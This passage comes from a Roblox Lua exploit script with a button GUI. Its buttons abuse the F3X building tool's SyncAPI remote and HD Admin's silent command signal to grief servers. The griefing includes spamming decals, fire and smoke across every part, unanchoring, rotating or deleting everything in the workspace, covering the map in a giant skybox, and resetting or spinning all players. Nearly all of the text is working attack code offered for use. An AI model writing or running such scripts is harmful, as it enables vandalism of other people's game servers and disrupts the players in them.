            end)
            
            if not success then
                warn("Error loading model: " .. tostring(result))
            end
        else
            warn("Please enter a valid model ID first!")
        end
    end)
    
    -- Update currentModelId when text changes
    modelIdInputBox:GetPropertyChangedSignal("Text"):Connect(function()
        currentModelId = modelIdInputBox.Text
    end)
    
    -- Add existing maps buttons below
    local buttonsStartPosition = 90
    for i, btnDef in ipairs(mapsButtons) do
        local mapBtn = Instance.new("TextButton")
        mapBtn.Size = UDim2.new(0.9, 0, 0, 30)
        mapBtn.Position = UDim2.new(0.05, 0, 0, buttonsStartPosition + (i-1)*35)
        mapBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        mapBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
        mapBtn.Font = Enum.Font.SourceSans
        mapBtn.TextSize = 14
        mapBtn.Text = btnDef.Name or "Button"
        mapBtn.AutoButtonColor = true
        mapBtn.BorderSizePixel = 0
        mapBtn.Parent = scrollFrame
        
        if btnDef.Callback then
            mapBtn.MouseButton1Click:Connect(btnDef.Callback)
        end
    end
    
    -- Make maps tab scrollable
    local totalHeight = buttonsStartPosition + (#mapsButtons * 35) + 10
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
end

local function CreateTabButton(name, parent, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 70, 0, 30)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.TextColor3 = Color3.fromRGB(240, 240, 240)
    btn.Font = Enum.Font.SourceSans
    btn.TextSize = 14
    btn.Text = name
    btn.AutoButtonColor = true
    btn.BorderSizePixel = 0
    btn.Parent = parent
    btn.MouseButton1Click:Connect(callback)
    return btn
end

local f3xTab = CreateTabButton("F3X Stuff", tabContainer, ShowF3XButtons)
local musicTab = CreateTabButton("Music", tabContainer, ShowMusicButtons)
local extraTab = CreateTabButton("Extra", tabContainer, ShowExtraButtons)
local mapsTab = CreateTabButton("Maps", tabContainer, ShowMapsButtons)
local customTab = CreateTabButton("Custom", tabContainer, ShowCustomButtons)

ShowF3XButtons()

-- Setup cleanup system for particles
spawn(function()
    while true do
        task.wait(10)
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end)

-- Auto-stop particles when player dies to prevent lag
local function setupDeathCleanup()
    local function onCharacterAdded(character)
        -- Stop particles when character dies
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            if particleSystemRunning then
                print("Player died - stopping particle system to prevent lag")
                stopParticleSystem()
            end
        end)
    end
    
    if player.Character then
        onCharacterAdded(player.Character)
    end
    player.CharacterAdded:Connect(onCharacterAdded)
end

setupDeathCleanup()
               
    
 
AddButton({
    Name = "Skybox",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5, 5, 5))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("99706029040118")
    end
})

AddButton({
    Name = "Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("99706029040118")
    end
})

AddButton({
    Name = "Particles",
    Callback = function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

for i, v in game.ReplicatedStorage:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

local remote = tool.SyncAPI.ServerEndpoint  

function _(args)  
    remote:InvokeServer(unpack(args))  
end  

function SetCollision(part, boolean)  
    local args = {  
        [1] = "SyncCollision",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CanCollide"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function SetAnchor(boolean, part)  
    local args = {  
        [1] = "SyncAnchor",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Anchored"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function CreatePart(cf, parent)  
    local args = {  
        [1] = "CreatePart",  
        [2] = "Normal",  
        [3] = cf,  
        [4] = parent  
    }  
    _(args)  
end  

function Resize(part, size, cf)  
    local args = {  
        [1] = "SyncResize",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CFrame"] = cf,  
                ["Size"] = size  
            }  
        }  
    }  
    _(args)  
end  

function AddDecal(part, asset, side)  
    local args = {  
        [1] = "SyncTexture",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal",  
                ["Texture"] = "rbxassetid://" .. asset  
            }  
        }  
    }  
    _(args)  
end  

function SpawnDecal(part, side)  
    local args = {  
        [1] = "CreateTextures",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal"  
            }  
        }  
    }  
    _(args)  
end  

function SetName(part, stringg)  
    local args = {  
        [1] = "SetName",  
        [2] = {  
            [1] = workspace.Part  
        },  
        [3] = stringg  
    }  
    _(args)  
end  

function SetTrans(part, int)  
    local args = {  
        [1] = "SyncMaterial",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Transparency"] = int  
            }  
        }  
    }  
    _(args)  
end  

local function delete(part)  
    local args = {  
        [1] = "Remove",  
        [2] = {  
            [1] = part  
        }  
    }  
    remote:InvokeServer(unpack(args))  
end  

local function particleEffect(textureId)
    while true do
        task.wait(0.1)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local x = hrp.Position.X + math.random(-60, 60)
            local z = hrp.Position.Z + math.random(-60, 60)
            local y = hrp.Position.Y - 50
            local spawnPosition = CFrame.new(x, y, z)

            task.spawn(function()
                CreatePart(spawnPosition, workspace)
                task.wait(0.1)

                for _, v in workspace:GetChildren() do
                    if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
                        local part = v
                        SetName(part, "particle")
                        Resize(part, Vector3.new(6, 6, 0.001), part.CFrame)
                        SetCollision(part, false)
                        SetTrans(part, 1)
                        SetAnchor(true, part)
                        part.Orientation = Vector3.new(0, 0, 0)

                        SpawnDecal(part, Enum.NormalId.Front)
                        AddDecal(part, textureId, Enum.NormalId.Front)
                        SpawnDecal(part, Enum.NormalId.Back)
                        AddDecal(part, textureId, Enum.NormalId.Back)

                        local up = 90
                        for i = 2, up do
                            if part and part.Parent then
                                local newCF = part.CFrame + Vector3.new(0, 2, 0)
                                Resize(part, part.Size, newCF)
                                task.wait(0.01)
                            end
                        end

                        delete(part)
                        break
                    end
                end
            end)
        else
            task.wait(1)
        end
    end
end

local textures = {
    "77421076756221",
}

for _, texId in ipairs(textures) do
    coroutine.wrap(function()
        particleEffect(texId)
    end)()
end
    end
})
AddButton({
    Name = "Sparkles All",
    Callback = function()
local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Sparkles"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()
    end
})
AddButton({
    Name = "Fire All",
    Callback = function()
local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		_(args)
	end
	function FireParts()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				AddFire(v)
			end)
		end
	end
	FireParts()

    end
})
AddButton({
    Name = "Smoke All",
    Callback = function()
        local function applyDecorationToPart(part)
		local argsCreate = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke"
				}
			}
		}

		local argsSync = {
			[1] = "SyncDecorate",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke",
					["Size"] = 20
				}
			}
		}

		local buildingTools = nil
		local player = game:GetService("Players").LocalPlayer

		-- Search for the tool in Character and Backpack
		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
				buildingTools = item
				break
			end
		end

		if not buildingTools then
			for _, item in pairs(player.Backpack:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
		end

		if buildingTools then
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
		elseif not warned then
			warn("Building tool not found inside player's inventory or backpack!")
			warned = true
		end
	end

	local function applyDecorationToAllParts(workspaceObject)
		for _, obj in pairs(workspaceObject:GetDescendants()) do
			if obj:IsA("Part") or obj:IsA("MeshPart") then
				applyDecorationToPart(obj)
			end
		end
	end

	applyDecorationToAllParts(workspace)
    end
})

AddButton({
    Name = "Rotate Spam",
    Callback = function()
        local player = game.Players.LocalPlayer
local tool

local function findTool()
    for _, v in pairs(player.Character:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    for _, v in pairs(player.Backpack:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    return nil
end

tool = findTool()
if not tool then
    warn("where is f3x skid")
    return
end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
    remote:InvokeServer(unpack(args))
end

local function SetLocked(part, boolean)
    _({"SetLocked", { part }, boolean})
end

local function MovePart(part, cf)
    _({ "SyncMove", { { Part = part, CFrame = cf } } })
end

-- ===========================================================
--  SAFE FILTER  AVOIDS KILLING PLAYERS
-- ===========================================================
local function isSafe(part)
    if not part:IsA("BasePart") then
        return false
    end
    
    -- skip all characters
    if part.Parent:FindFirstChildOfClass("Humanoid") then
        return false
    end

    -- skip any descendant of a character
    if game.Players:FindFirstChild(part.Parent.Name) then
        return false
    end

    -- skip tools
    if part:IsDescendantOf(game.Players.LocalPlayer.Backpack) then
        return false
    end
    if part:IsDescendantOf(game.Players.LocalPlayer.Character) then
        return false
    end

    -- skip meshes / accessories
    if part.Parent:IsA("Accessory") then
        return false
    end

    return true
end

local function randomise()
    for _, v in pairs(game.Workspace:GetDescendants()) do
        if isSafe(v) then
            task.spawn(function()
                SetLocked(v, false)
                MovePart(
                    v,
                    v.CFrame *
                    CFrame.Angles(
                        math.rad(math.random(0, 360)),
                        math.rad(math.random(0, 360)),
                        math.rad(math.random(0, 360))
                    )
                )
            end)
        end
    end
end

randomise()
    end
})
AddButton({
    Name = "Unanchor All",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

if not tool or not tool:FindFirstChild("SyncAPI") then

	warn("you don't have f3x skid")

	return

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{

			part

		}

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{

				Part = part

			}

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{

			part

		},

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{

			part1,

			part2

		},

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{

			part

		},

		boolean

	}

	_(args)

end

function SetTrans(part, int)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = int

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Unanchor()

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			task.spawn(function()

				SetLocked(v, false)

				SetAnchor(false, v)

			end)

		end

	end

end

Unanchor()
    end
})
AddButton({
    Name = "k00pify",
    Callback = function()
        -- HD Admin Commands
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")

-- SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

-- SyncAPI Functions
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
    _({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
    _({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

local function SetVertexColor(part, color)
    _({"SyncMesh", {{Part = part, VertexColor = color}}})
end

-- Giant Sky Function (65000-70000 scale)
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(3, 3, 3)) -- vertex color
            MeshResize(v, Vector3.new(109888, 109888, 109888)) -- massive scale
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end

-- Spam Function
local function Spam(id)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            task.spawn(function()
                SetLocked(v, false)
                for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                    SpawnDecal(v, side)
                    AddDecal(v, id, side)
                end
            end)
        end
    end
end

-- Execute (Decal spam first, then skybox)
Spam("9422866248") -- spam decals first
GiantSky("9422866248") -- giant skybox second
    end
})
AddButton({
    Name = "Delete Everything",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local function getf3x()
for _, v in ipairs(backpack:GetChildren()) do
if v:FindFirstChild("SyncAPI") then
return v
end
end
for _, v in ipairs(char:GetChildren()) do
if v:FindFirstChild("SyncAPI") then
return v
end
end
return nil
end

local f3x = getf3x()
if not f3x then
warn("you don't have f3x skid")
return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function delete(part)
local args = { "Remove", { part } }
serverendpoint:InvokeServer(unpack(args))
end

local function deleteall()
for _, v in ipairs(workspace:GetDescendants()) do
if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
spawn(function() delete(v) end)
end
end
end

deleteall()
    end
})
AddButton({
    Name = "Reset all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";res all")
    end
})
AddButton({
    Name = "Spin All",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";spin all 16")


 end
})
AddButton({
    Name = "Old Meme Particles",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

for i, v in game.ReplicatedStorage:GetDescendants() do  
    if v.Name == "SyncAPI" then  
        tool = v.Parent  
    end  
end  

local remote = tool.SyncAPI.ServerEndpoint  

function _(args)  
    remote:InvokeServer(unpack(args))  
end  

function SetCollision(part, boolean)  
    local args = {  
        [1] = "SyncCollision",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CanCollide"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function SetAnchor(boolean, part)  
    local args = {  
        [1] = "SyncAnchor",  
